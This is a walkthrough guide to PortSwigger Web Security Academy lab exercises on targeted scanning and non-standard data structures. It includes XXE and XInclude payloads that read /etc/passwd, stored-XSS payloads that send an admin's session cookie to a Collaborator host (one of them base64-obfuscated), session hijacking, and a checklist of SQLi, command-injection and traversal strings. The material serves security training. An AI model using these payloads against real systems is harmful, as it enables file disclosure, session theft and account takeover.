# PortSwigger Web Security Academy - Essential Skills Labs
## Complete Guide with Step-by-Step Solutions

---

## Table of Contents

1. [Introduction to Essential Skills](#introduction)
2. [Lab 1: Discovering Vulnerabilities Quickly with Targeted Scanning](#lab1)
3. [Lab 2: Scanning Non-Standard Data Structures](#lab2)
4. [Mystery Lab Challenge](#mystery-labs)
5. [Obfuscating Attacks Using Encodings](#encoding-techniques)
6. [Using Burp Scanner During Manual Testing](#burp-scanner-integration)
7. [Real-World Application](#real-world)
8. [References and Resources](#references)

---

## Introduction to Essential Skills {#introduction}

### What are Essential Skills?

The Essential Skills section of PortSwigger's Web Security Academy teaches **broadly applicable skills** that help security practitioners apply their lab knowledge to real-world targets. Unlike specific vulnerability-focused labs (SQL injection, XSS, etc.), Essential Skills focus on:

- **Methodology and workflow optimization**
- **Tool integration and efficiency**
- **Evasion and obfuscation techniques**
- **Working with time constraints**
- **Identifying vulnerabilities in non-obvious locations**

### Why Essential Skills Matter

In real-world penetration testing:
- Websites have often been audited with obvious vulnerabilities already patched
- Input filters and WAFs require bypass techniques
- Time constraints demand efficient workflows
- Vulnerabilities hide in non-standard data structures
- Testers must discover vulnerabilities without knowing what to look for

### Current Status (2026)

**Total Labs:** 2 (both Practitioner level)

**Topics Covered:**
1. **Obfuscating Attacks Using Encodings** - Instructional content with techniques applied across other labs
2. **Using Burp Scanner During Manual Testing** - 2 dedicated labs
3. **Mystery Lab Challenge** - Randomized practice feature

**Future Expansion:** PortSwigger plans to add more Essential Skills topics and labs in the near future.

---

## Lab 1: Discovering Vulnerabilities Quickly with Targeted Scanning {#lab1}

### Lab Overview

| Property | Value |
|----------|-------|
| **Lab Name** | Lab: Discovering vulnerabilities quickly with targeted scanning |
| **Difficulty** | Practitioner |
| **Time Constraint** | 10 minutes |
| **Objective** | Retrieve the contents of `/etc/passwd` |
| **URL** | https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning |

### Lab Description

This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of `/etc/passwd` within 10 minutes.

**Key Challenge:** The vulnerability type is not disclosed upfront. You must use Burp Scanner efficiently to identify the attack vector quickly, then manually exploit it.

**Note:** PortSwigger does not provide step-by-step solutions for Essential Skills labs to encourage independent problem-solving.

### Learning Objectives

1. **Efficient vulnerability discovery** - Use Burp Scanner strategically under time pressure
2. **Intuition development** - Identify potentially vulnerable endpoints through reconnaissance
3. **Tool integration** - Combine automated scanning with manual expertise
4. **Time management** - Complete reconnaissance and exploitation within 10 minutes
5. **Rapid exploitation** - Quickly transition from vulnerability identification to exploitation

### Prerequisites

- Understanding of Burp Suite functionality (Scanner, Repeater, Proxy)
- Basic reconnaissance skills
- Familiarity with file-reading vulnerabilities (path traversal, XXE, etc.)
- Ability to interpret scanner findings

### Step-by-Step Solution

#### Step 1: Initial Reconnaissance (1-2 minutes)

1. **Start the lab** and note the 10-minute timer
2. **Navigate the application** to understand its functionality
3. **Identify key features:**
   - Product catalog browsing
   - Product details page with "Check stock" functionality
   - Potentially dynamic content areas

**Burp Suite Setup:**
```
1. Ensure Burp Proxy is intercepting
2. Browse the application to capture requests in HTTP History
3. Look for interesting parameters, especially XML/JSON data structures
```

#### Step 2: Identify Attack Surface (1 minute)

1. **Focus on the "Check stock" feature** - a common location for vulnerabilities
2. **Check the HTTP request in Burp Proxy History:**

```http
POST /product/stock HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Key Observation:** The application accepts XML input - potential XXE vulnerability!

#### Step 3: Targeted Burp Scanner Analysis (2-3 minutes)

1. **Right-click the "Check stock" request** in Proxy > HTTP History
2. **Select "Scan selected insertion point"** or "Do active scan"
3. **Focus on XML-related issues:**
   - External entity injection
   - XML injection
   - XInclude attacks

**Scanner Configuration:**
```
- Use "Audit checks - all except time-based detection" for speed
- Prioritize XML-related issue types
- Review findings as they appear (don't wait for completion)
```

**Expected Scanner Finding:**
- **Issue:** XML external entity injection
- **Confidence:** Firm
- **Evidence:** Scanner successfully induced a DNS lookup or received response indicating XXE

#### Step 4: Manual Exploitation - Basic XXE (2 minutes)

**Attempt 1: Classic XXE with External Entity**

```http
POST /product/stock HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/xml
Content-Length: 207

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Potential Issue:** Some applications block DOCTYPE declarations or external entities.

#### Step 5: Alternative Approach - XInclude Attack (2-3 minutes)

If the classic XXE doesn't work (or if scanner identified XInclude as the vector):

**XInclude Payload:**

```http
POST /product/stock HTTP/2
Host: [lab-id].web-security-academy.net
Content-Type: application/xml
Content-Length: 234

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo></productId>
    <storeId>1</storeId>
</stockCheck>
```

**Why XInclude?**
- Works when you can't modify the DOCTYPE (some applications validate/strip it)
- Uses XML namespace to include external files
- Common in scenarios where XML is parsed deeper in the application stack

#### Step 6: Verify Success

**Successful Response:**

```http
HTTP/2 200 OK
Content-Type: text/plain
Content-Length: 2847

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
...
carlos:x:1001:1001::/home/carlos:/bin/bash
peter:x:1002:1002::/home/peter:/bin/bash
```

**Lab Solved:** The application returns the contents of `/etc/passwd` in the response.

### Key Techniques Used

1. **Rapid Attack Surface Identification** - Quickly identify XML input as high-value target
2. **Targeted Scanning** - Use Burp Scanner on specific requests rather than full site scan
3. **Scanner-Guided Exploitation** - Let scanner findings guide manual testing
4. **XInclude Technique** - Use when DOCTYPE modification is restricted
5. **Time Management** - Complete within 10-minute constraint

### Common Mistakes

❌ **Running a full-site scan** - Takes too long, wastes time
❌ **Ignoring scanner findings** - Scanner provides valuable hints about vulnerability types
❌ **Not testing alternative XXE techniques** - If one approach fails, try XInclude
❌ **Missing the XML input** - Always check Content-Type headers for non-standard formats

### Troubleshooting

**Problem:** Scanner doesn't find anything
- **Solution:** Manually test for XXE anyway - scanner may miss some configurations

**Problem:** Classic XXE with DOCTYPE doesn't work
- **Solution:** Try XInclude approach (as shown in Step 5)

**Problem:** Response doesn't include file contents
- **Solution:** Check if response is URL-encoded or requires different encoding

**Problem:** Running out of time
- **Solution:** Skip full scanning, go directly to manual XXE testing based on XML observation

### Time Breakdown (Target: 10 minutes)

| Phase | Time | Activity |
|-------|------|----------|
| Reconnaissance | 1-2 min | Browse app, identify features |
| Attack Surface | 1 min | Identify XML input in "Check stock" |
| Scanner | 2-3 min | Targeted scan on XML endpoint |
| Exploitation | 2-3 min | Manual XXE/XInclude testing |
| Verification | 1 min | Confirm /etc/passwd retrieval |

### Speed-Run Strategy (Advanced)

For experienced testers who can complete in **3-5 minutes:**

1. **Immediate reconnaissance (30 seconds)** - Spot "Check stock" feature
2. **Check request (30 seconds)** - See XML structure
3. **Skip scanner entirely** - Go directly to manual XXE/XInclude testing (2 minutes)
4. **Test both approaches** - Classic XXE and XInclude (1-2 minutes)

### Real-World Application

**Scenario:** Bug bounty on an e-commerce platform with 100+ endpoints

**Traditional Approach (Inefficient):**
- Run full automated scan on entire application
- Wait hours for results
- Manually verify hundreds of false positives
- Miss actual vulnerabilities in obscure features

**Essential Skills Approach (Efficient):**
1. Manually identify high-value features (payment, inventory, APIs)
2. Analyze request formats (XML, JSON, custom protocols)
3. Run targeted scans on specific requests
4. Immediately test promising vectors manually
5. Focus on features that process structured data

**Time Savings:** Hours → Minutes

### Related Vulnerabilities

This lab's techniques apply to:
- **XXE Injection** - External entity exploitation
- **XInclude Attacks** - When DOCTYPE is restricted
- **SSRF via XXE** - Accessing internal resources
- **File Disclosure** - Reading server files
- **RCE via XXE** - In PHP's expect:// wrapper environments

### Further Reading

- [XXE Injection Reference](./xxe-cheat-sheet.md)
- [XXE PortSwigger Labs Complete Guide](./xxe-portswigger-labs-complete.md)
- [SSRF Techniques](./ssrf-cheat-sheet.md)

---

## Lab 2: Scanning Non-Standard Data Structures {#lab2}

### Lab Overview

| Property | Value |
|----------|-------|
| **Lab Name** | Lab: Scanning non-standard data structures |
| **Difficulty** | Practitioner |
| **Objective** | Delete the user "carlos" |
| **Credentials** | wiener:peter |
| **URL** | https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures |

### Lab Description

This lab's vulnerability is hidden in an unconventional data structure that is difficult to discover manually. To solve the lab:
1. Use Burp Scanner's "Scan selected insertion point" feature to identify the vulnerability
2. Manually exploit the vulnerability to delete the user "carlos"

**Key Challenge:** The vulnerability exists in a **non-standard cookie format** where the application parses the cookie as separate inputs, but this isn't obvious from manual inspection.

### Learning Objectives

1. **Non-obvious attack vectors** - Test data structures that don't appear vulnerable
2. **Burp Scanner advanced features** - Use "Scan selected insertion point" on custom locations
3. **Cookie manipulation** - Exploit vulnerabilities in session cookies
4. **Stored XSS exploitation** - Leverage XSS to steal admin credentials
5. **Privilege escalation** - Use stolen session to perform admin actions

### Prerequisites

- Burp Suite Professional (Scanner required for insertion point scanning)
- Understanding of stored XSS vulnerabilities
- Familiarity with cookie manipulation
- Knowledge of Burp Collaborator for out-of-band detection

### Lab Environment

**Test Account:**
```
Username: wiener
Password: peter
```

**Session Cookie Format:**
```
Cookie: session=wiener:AbCdEfGhIjKlMnOp1234567890
```

**Key Observation:** The cookie contains:
- Username (`wiener`)
- Colon separator (`:`)
- Session token (`AbCdEfGhIjKlMnOp1234567890`)

This suggests the application **parses the cookie as two separate inputs**, even though it appears as a single value.

### Step-by-Step Solution

#### Step 1: Initial Login and Reconnaissance (2 minutes)

1. **Start the lab** and log in with credentials `wiener:peter`
2. **Observe the session cookie** in Burp:

```http
GET /my-account HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=wiener:AbCdEfGhIjKlMnOp1234567890
```

3. **Browse the application:**
   - View your account page
   - Post comments on blog posts
   - Explore admin functionality (access denied)

#### Step 2: Understanding the Data Structure (2 minutes)

**Hypothesis:** The application extracts the username from the session cookie separately from the token.

**Evidence:**
- Account page displays "wiener" as the username
- Cookie format `username:token` suggests parsing logic
- Application likely processes username for display/functionality

**Potential Vulnerability:** If the username portion is used unsafely (e.g., in HTML context without encoding), it could be vulnerable to XSS.

#### Step 3: Manual Testing (Optional - Helps Understanding)

**Attempt to manually test username manipulation:**

```http
GET /my-account HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=<script>alert(1)</script>:AbCdEfGhIjKlMnOp1234567890
```

**Problem:** Application likely rejects the modified cookie or doesn't render the XSS payload in an observable location. This is why **targeted scanning** is essential.

#### Step 4: Burp Scanner - Scan Selected Insertion Point (3 minutes)

This is the **critical technique** this lab teaches.

**Procedure:**

1. **Find a request with the session cookie** (e.g., GET /my-account)
2. **Send to Repeater** (Ctrl+R or Cmd+R)
3. **Highlight the username portion of the cookie:**
   ```
   Cookie: session=wiener:AbCdEfGhIjKlMnOp1234567890
                   ^^^^^^ (highlight just "wiener")
   ```
4. **Right-click the highlighted text** → **"Scan selected insertion point"**

**Burp Scanner Configuration:**
```
Issue types: All (or focus on XSS-related)
Insertion point: Custom (the highlighted portion)
```

5. **Wait for scanner to complete** (1-2 minutes)

**Scanner Finding:**

```
Issue: Stored cross-site scripting
Severity: High
Confidence: Certain
Location: Cookie: session (username portion before colon)
Evidence: Scanner payload was stored and executed in response
```

**Scanner Payload Example:**
```
<script>alert(1)</script>
```

The scanner discovered that when the username portion contains XSS payloads, they are **stored** (not just reflected) and executed in a context visible to other users (likely the admin viewing user activity).

#### Step 5: Crafting the Exploit Payload (3 minutes)

**Goal:** Steal the administrator's session cookie using stored XSS.

**Attack Flow:**
1. Inject XSS payload into username portion of our cookie
2. XSS payload executes when admin views our activity/profile
3. Payload steals admin's session cookie
4. Exfiltrate cookie to Burp Collaborator
5. Use admin session to delete carlos

**Exploit Payload:**

```javascript
<script>
document.location='https://YOUR-COLLABORATOR-ID.oastify.com/?c='+document.cookie;
</script>
```

**Get Burp Collaborator URL:**
1. Burp Suite → Burp menu → **Burp Collaborator client**
2. Click **"Copy to clipboard"** to get your unique Collaborator URL
3. Example: `abc123xyz.oastify.com`

**Modified Session Cookie:**

```http
GET /my-account HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=<script>document.location='https://abc123xyz.oastify.com/?c='%2bdocument.cookie;</script>:AbCdEfGhIjKlMnOp1234567890
```

**Important Encoding Notes:**
- URL-encode special characters in cookie value
- `+` becomes `%2b`
- Space becomes `%20` or `+`
- Test in Repeater first

#### Step 6: Inject the Payload (2 minutes)

**Method 1: Direct Cookie Modification in Burp**

1. **Intercept a request** (any request to the application)
2. **Modify the Cookie header** to include your XSS payload:

```http
Cookie: session=<script>document.location='https://abc123xyz.oastify.com/?c='%2bdocument.cookie;</script>:AbCdEfGhIjKlMnOp1234567890
```

3. **Forward the request**
4. **Navigate through the application** to ensure the payload is stored

**Method 2: Browser Developer Console**

```javascript
document.cookie = "session=<script>document.location='https://abc123xyz.oastify.com/?c='%2bdocument.cookie;</script>:AbCdEfGhIjKlMnOp1234567890";
location.reload();
```

**Verification:**
- Check that subsequent requests use the modified cookie
- The payload should be **stored**, not just reflected

#### Step 7: Wait for Admin Interaction (1-2 minutes)

**How the Attack Works:**

1. The admin periodically views user accounts/activity
2. When admin views your account, the stored XSS in your username executes
3. The JavaScript payload runs in the admin's browser context
4. Admin's session cookie is sent to your Burp Collaborator

**Check Burp Collaborator:**

1. Open **Burp Collaborator client**
2. Click **"Poll now"**
3. Look for HTTP requests with cookie data in the query string:

```
GET /?c=session=administrator:ZxYwVuTsRqPoNmLkJiHgFeDcBa9876543210 HTTP/1.1
Host: abc123xyz.oastify.com
User-Agent: Mozilla/5.0 ...
```

**Extract the Admin Session Cookie:**
```
session=administrator:ZxYwVuTsRqPoNmLkJiHgFeDcBa9876543210
```

#### Step 8: Access Admin Panel with Stolen Session (2 minutes)

1. **Replace your session cookie with the admin's:**
   - Burp Proxy → Intercept → Modify Cookie header
   - Or use browser dev tools to set the cookie

```http
GET /admin HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=administrator:ZxYwVuTsRqPoNmLkJiHgFeDcBa9876543210
```

2. **Navigate to the admin panel:**
   ```
   https://[lab-id].web-security-academy.net/admin
   ```

3. **You should see the admin panel** with user management functionality

#### Step 9: Delete User Carlos (1 minute)

**Admin Panel UI:**
- List of users: administrator, wiener, carlos
- Delete button next to each user

**Delete Carlos:**

1. **Click "Delete" next to carlos** in the admin panel
2. **Or send the delete request directly:**

```http
GET /admin/delete?username=carlos HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=administrator:ZxYwVuTsRqPoNmLkJiHgFeDcBa9876543210
```

**Success Response:**

```http
HTTP/2 302 Found
Location: /admin
```

**Lab Solved:** User "carlos" has been deleted.

### Complete Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│ Step 1: Scan Session Cookie Username Portion               │
│ Burp Scanner → Discovers Stored XSS in username            │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 2: Inject XSS Payload in Cookie                       │
│ Cookie: session=<script>steal cookie</script>:token         │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 3: Admin Views Attacker's Account                     │
│ XSS executes in admin's browser → Cookie exfiltrated       │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 4: Burp Collaborator Receives Admin Cookie            │
│ Extract: session=administrator:AdminToken                   │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 5: Use Admin Session to Delete Carlos                 │
│ GET /admin/delete?username=carlos                           │
└─────────────────────────────────────────────────────────────┘
```

### Key Techniques Used

1. **Scan Selected Insertion Point** - Most important technique
   - Manually identify non-obvious data structures
   - Highlight specific portions of parameters/cookies
   - Let scanner test that specific location

2. **Non-Standard Data Structure Recognition**
   - Cookies with delimiters (`:`, `|`, `;`)
   - JSON within cookies/headers
   - Base64-encoded data with embedded fields
   - Custom serialization formats

3. **Stored XSS Exploitation**
   - Payload persists across sessions
   - Executes when other users (admin) view the data
   - Enables cookie theft, CSRF, account takeover

4. **Burp Collaborator for Exfiltration**
   - Out-of-band data exfiltration
   - Captures cookies/data from other users
   - Confirms blind vulnerabilities

5. **Privilege Escalation via Session Hijacking**
   - Steal high-privilege session tokens
   - Perform admin actions with stolen session
   - Complete objectives (delete user)

### Common Mistakes

❌ **Only testing standard parameter locations** - Missing non-obvious attack vectors
❌ **Running full scans instead of targeted insertion point scans** - Inefficient and may miss specific vectors
❌ **Not URL-encoding payload in cookie** - Payload may not parse correctly
❌ **Forgetting to include original token after colon** - Session becomes invalid
❌ **Not polling Burp Collaborator** - Missing the exfiltrated admin cookie
❌ **Testing payload in reflected context only** - This is STORED XSS visible to other users

### Troubleshooting

**Problem:** Scanner doesn't find XSS in cookie
- **Solution:** Ensure you highlighted ONLY the username portion, not the entire cookie value
- **Solution:** Try manually testing with a simple payload like `<img src=x onerror=alert(1)>`

**Problem:** XSS payload doesn't execute
- **Solution:** Check if cookie is properly URL-encoded
- **Solution:** Try alternative XSS payloads (see Alternative Payloads section)

**Problem:** Burp Collaborator doesn't receive callback
- **Solution:** Wait 30-60 seconds for admin to view your profile
- **Solution:** Navigate through the app to trigger updates
- **Solution:** Check if payload is properly formatted (syntax errors prevent execution)

**Problem:** Admin cookie is truncated or malformed
- **Solution:** Use `%2b` instead of `+` for concatenation
- **Solution:** Ensure URL encoding doesn't break the payload

**Problem:** Can't access /admin with stolen cookie
- **Solution:** Verify you copied the ENTIRE cookie value including token
- **Solution:** Check for typos in cookie value

### Alternative Payloads

**Basic Alert (Testing):**
```javascript
<script>alert(document.cookie)</script>
```

**Img Tag (WAF Bypass):**
```html
<img src=x onerror="fetch('https://YOUR-COLLAB.oastify.com/?c='+document.cookie)">
```

**Fetch API (Modern Approach):**
```javascript
<script>fetch('https://YOUR-COLLAB.oastify.com/?c='+btoa(document.cookie))</script>
```

**XMLHttpRequest (Classic):**
```javascript
<script>var x=new XMLHttpRequest();x.open('GET','https://YOUR-COLLAB.oastify.com/?c='+document.cookie);x.send();</script>
```

**Obfuscated (Advanced):**
```javascript
<script>eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vWU9VUi1DT0xMQUIub2FzdGlmeS5jb20vP2M9Jytkb2N1bWVudC5jb29raWU='))</script>
```
(Base64-encoded payload for evasion)

### Time Breakdown

| Phase | Time | Activity |
|-------|------|----------|
| Login & Recon | 2 min | Understand app, observe cookie format |
| Data Structure Analysis | 2 min | Identify colon-separated cookie fields |
| Manual Testing (Optional) | 2 min | Attempt manual XSS (if curious) |
| Scanner Insertion Point | 3 min | Highlight username, scan, review findings |
| Payload Crafting | 3 min | Create XSS payload with Collaborator |
| Payload Injection | 2 min | Modify cookie with XSS |
| Wait for Admin | 1-2 min | Admin views profile, XSS executes |
| Burp Collaborator Check | 1 min | Poll for callback, extract admin cookie |
| Access Admin Panel | 2 min | Use stolen session |
| Delete Carlos | 1 min | Complete objective |
| **Total** | **15-20 min** | Complete lab |

### Speed-Run Strategy (Advanced)

For experienced testers who can complete in **8-10 minutes:**

1. **Immediate cookie analysis (1 min)** - Spot colon-separated format
2. **Direct to scanner (2 min)** - Skip manual testing, scan username insertion point
3. **Pre-prepared payload (1 min)** - Have Collaborator payload ready
4. **Inject and wait (2 min)** - Modify cookie, wait for callback
5. **Admin action (2 min)** - Use stolen session, delete carlos

### Real-World Application

**Non-Standard Data Structures in the Wild:**

1. **API Tokens with Embedded Data:**
   ```
   Authorization: Bearer user-id:role:token:signature
   ```
   Each segment may be processed separately with different validation

2. **Custom Session Formats:**
   ```
   Session: {"user":"admin","role":"guest","csrf":"abc123"}|signature
   ```
   JSON with signature - scanner may miss JSON-internal fields

3. **Multi-Part Cookies:**
   ```
   Cookie: uid=123; role=user; prefs=lang:en|theme:dark
   ```
   Preferences string may be parsed as key-value pairs

4. **Base64-Encoded Structures:**
   ```
   Cookie: data=eyJ1c2VyIjoid2llbmVyIiwicm9sZSI6Imd1ZXN0In0=
   ```
   Decode reveals JSON: `{"user":"wiener","role":"guest"}`

**Why Manual Analysis + Targeted Scanning Matters:**

- Automated scanners test standard locations (URL params, POST body, headers)
- Non-standard formats require human analysis to identify structure
- "Scan selected insertion point" tells scanner exactly where to test
- Combines human intuition with automated payload testing

### Related Vulnerabilities

Techniques from this lab apply to:

- **Stored XSS** - Persistence and multi-user exploitation
- **Cookie Manipulation** - Session hijacking, privilege escalation
- **Parameter Pollution** - Testing multiple parameters in single value
- **CSRF** - Combining XSS with CSRF for forced actions
- **Account Takeover** - Session theft via XSS

### Further Reading

- [Cross-Site Scripting Reference](./cross-site-scripting.md)
- [XSS PortSwigger Labs Complete Guide](./xss-portswigger-labs-complete.md)
- [Authentication Attack Techniques](./authentication-portswigger-labs-complete.md)

---

## Mystery Lab Challenge {#mystery-labs}

### Overview

The **Mystery Lab Challenge** is not a specific lab but rather a **feature** that generates randomized labs with hidden titles and descriptions to simulate real-world penetration testing scenarios.

| Property | Value |
|----------|-------|
| **Type** | Randomized practice feature |
| **Purpose** | Test reconnaissance and identification skills |
| **Difficulty** | Primarily Practitioner level |
| **Certification Requirement** | Complete 5 Practitioner mystery labs for Burp Suite Certified Practitioner exam prep |
| **URL** | https://portswigger.net/web-security/mystery-lab-challenge |

### How It Works

**Three Randomization Options:**

1. **Random Vulnerability, Specific Difficulty:**
   - Select: Apprentice, Practitioner, or Expert
   - Lab: Random vulnerability type at chosen difficulty
   - Use case: Practice at your skill level

2. **Random Lab from Specific Topic:**
   - Select: Difficulty + Topic (e.g., Practitioner + SQL Injection)
   - Lab: Random lab from that category
   - Use case: Focus on specific vulnerability type

3. **Completely Random:**
   - Select: Nothing (leave both dropdowns default)
   - Lab: Random lab from entire catalog
   - Use case: True real-world simulation

### Purpose and Skills Developed

**Real-World Simulation:**
- In actual penetration tests, you don't know what vulnerabilities exist
- You must identify vulnerabilities through reconnaissance and testing
- No hints about vulnerability type, location, or exploitation method

**Skills Practiced:**

1. **Reconnaissance** - Comprehensive application mapping
2. **Analytical Thinking** - Pattern recognition from behavior
3. **Vulnerability Identification** - Testing without prior knowledge
4. **Tool Proficiency** - Using Burp Suite features effectively
5. **Time Management** - Efficient testing methodology
6. **Problem Solving** - Overcoming obstacles without solutions

### Lab Resources Provided

**Test Account:**
```
Username: wiener
Password: peter
```

**Wordlists:**
- Username wordlist (for user enumeration/brute force)
- Password wordlist (for authentication attacks)

**Access:** Click "Access the lab" to reveal resources

### Certification Preparation

**Burp Suite Certified Practitioner Requirements:**

- **Complete 5 Practitioner-level mystery labs** successfully
- Demonstrates ability to identify vulnerabilities independently
- Proves readiness for exam format (which includes unknown vulnerabilities)

**Skill Level Gauge:**
- Comfortably completing Apprentice/Practitioner labs without solutions = ready for certification
- Struggling with mystery labs = more practice needed

### Recommended Approach

#### Phase 1: Reconnaissance (10-15 minutes)

1. **Application Mapping:**
   - Navigate all features and functionality
   - Identify input points (forms, parameters, headers)
   - Map user roles (guest, authenticated user, admin)

2. **Technology Detection:**
   - Review HTTP responses for server headers
   - Identify frameworks (PHP, Java, .NET, Python, etc.)
   - Note interesting features (file upload, comment forms, search)

3. **Burp Suite Setup:**
   - Ensure all requests captured in HTTP History
   - Build Site Map
   - Review Burp Scanner findings (if using Pro)

#### Phase 2: Hypothesis Generation (5 minutes)

**Common Vulnerability Patterns:**

- **Authentication features** → Brute force, 2FA bypass, password reset flaws
- **Search functionality** → SQL injection, XSS
- **File upload** → RCE, path traversal, XSS
- **User-generated content** → Stored XSS, CSRF
- **API endpoints** → IDOR, mass assignment, information disclosure
- **Admin panels** → Access control issues, privilege escalation

**Prioritize Testing:**
- High-value targets first (authentication, file operations, admin functions)
- Common vulnerability types (SQLi, XSS, access control)
- Unusual features or behaviors

#### Phase 3: Testing (30-45 minutes)

**Systematic Testing Checklist:**

1. **SQL Injection:**
   ```
   ' OR '1'='1'--
   1' UNION SELECT NULL--
   ```

2. **XSS:**
   ```
   <script>alert(1)</script>
   <img src=x onerror=alert(1)>
   ```

3. **Access Control:**
   ```
   Test with different user roles
   Manipulate IDs and usernames
   Try to access /admin
   ```

4. **CSRF:**
   ```
   Check for anti-CSRF tokens
   Test token validation
   ```

5. **Path Traversal:**
   ```
   ../../../../etc/passwd
   ..%2f..%2f..%2fetc/passwd
   ```

6. **Command Injection:**
   ```
   ; whoami
   | whoami
   `whoami`
   ```

7. **XXE:**
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   ```

8. **Deserialization:**
   ```
   Check cookies for serialized objects
   Test with modified serialized data
   ```

#### Phase 4: Exploitation (15-30 minutes)

Once you identify the vulnerability:
1. **Craft exploit** specific to the vulnerability type
2. **Achieve the lab objective** (varies by lab)
3. **Verify success** - lab should mark as solved

### Common Mystery Lab Vulnerability Types

Based on PortSwigger's lab catalog, expect:

| Category | Likelihood | Examples |
|----------|------------|----------|
| SQL Injection | High | UNION attacks, blind SQLi |
| XSS | High | Reflected, stored, DOM-based |
| Access Control | High | IDOR, horizontal/vertical privilege escalation |
| Authentication | Medium | Brute force, password reset, 2FA bypass |
| SSRF | Medium | Internal resource access, cloud metadata |
| XXE | Medium | File disclosure, SSRF via XXE |
| CSRF | Medium | State-changing requests without tokens |
| OS Command Injection | Low | Blind and direct command injection |
| Path Traversal | Low | File reading via directory traversal |

### Tips for Success

✅ **Start with common vulnerabilities** - SQLi and XSS are most frequent
✅ **Use Burp Scanner** (Pro) - Let it run while you test manually
✅ **Test all input points** - Parameters, headers, cookies, file uploads
✅ **Follow the data** - Where does user input go? Where is it reflected?
✅ **Check for test accounts** - wiener:peter often has special functionality
✅ **Look for admin panels** - Common at /admin, /administrator, /admin-panel
✅ **Read error messages** - Verbose errors reveal technology and vulnerabilities
✅ **Try encoding** - URL encoding, HTML encoding, Unicode escaping
✅ **Test with different HTTP methods** - GET, POST, PUT, DELETE
✅ **Be systematic** - Don't skip steps in your methodology

### Time Management

**Target Time per Mystery Lab:** 60-90 minutes

| Phase | Time | Focus |
|-------|------|-------|
| Reconnaissance | 15 min | Map application, identify features |
| Hypothesis | 5 min | Determine likely vulnerability types |
| Initial Testing | 20 min | Test top 3 hypotheses |
| Deeper Testing | 20 min | Systematic checklist approach |
| Exploitation | 15 min | Craft and execute exploit |
| Verification | 5 min | Confirm lab solved |

**If Stuck After 60 Minutes:**
- Take a break (fresh perspective helps)
- Review all HTTP requests in Burp History
- Check if you missed any features or endpoints
- Try less common vulnerability types
- Consider combining vulnerabilities (e.g., XSS + CSRF)

### Real-World Application

**Mystery Labs Simulate:**

1. **Bug Bounty Hunting:**
   - Unknown vulnerabilities in target applications
   - Need to identify issues without hints
   - Time-boxed testing windows

2. **Penetration Testing:**
   - Client applications with unknown security posture
   - Comprehensive vulnerability assessment
   - Report all findings regardless of type

3. **Capture the Flag (CTF) Competitions:**
   - Hidden vulnerabilities with no descriptions
   - Competitive time pressure
   - Multiple potential attack vectors

**Skills Transferable to Real Work:**
- Systematic methodology prevents overlooking vulnerabilities
- Independent problem-solving without relying on guides
- Efficient time management under pressure
- Comprehensive reconnaissance and testing

### Example Mystery Lab Walkthrough

**Scenario:** Mystery Lab (Practitioner difficulty)

**Phase 1: Reconnaissance (10 min)**
- Application: Blog platform with posts, comments, search
- Features: Login, post comments, search posts
- Test account: wiener:peter
- Observation: Search parameter reflects user input in results

**Phase 2: Hypothesis (5 min)**
- Reflected search input → Likely XSS
- Database-driven search → Possible SQLi
- Comments stored → Potential stored XSS

**Phase 3: Testing (15 min)**

**SQL Injection Test:**
```
Search: test' OR '1'='1'--
Result: No change, likely not SQLi
```

**Reflected XSS Test:**
```
Search: <script>alert(1)</script>
Result: Input is HTML-encoded: &lt;script&gt;alert(1)&lt;/script&gt;
Conclusion: Basic XSS blocked
```

**DOM XSS Test:**
```
Search: test
Observation: JavaScript processes search parameter
JavaScript code: document.write(getQueryString('search'))
Conclusion: Vulnerable to DOM XSS!
```

**Phase 4: Exploitation (10 min)**

**Payload:**
```
https://lab-id.web-security-academy.net/?search=<img src=x onerror=alert(1)>
```

**Result:** XSS executes, lab objective met

**Total Time:** 40 minutes

### Further Reading

- Complete all Apprentice labs before attempting Practitioner mystery labs
- Review all Practitioner labs in each category for comprehensive coverage
- Practice with mystery labs weekly to maintain skills

---

## Obfuscating Attacks Using Encodings {#encoding-techniques}

### Overview

**Obfuscating attacks using encodings** is one of the three core topics in the Essential Skills section. While there are no standalone labs specifically for this topic, these techniques are **essential for solving advanced labs** and real-world testing.

### Why Encoding Matters

**In Real-World Testing:**

1. **Input Filters** - Applications block obvious attack patterns
2. **Web Application Firewalls (WAFs)** - Signature-based detection prevents common payloads
3. **Blacklist Bypass** - Forbidden keywords can be encoded to evade filters
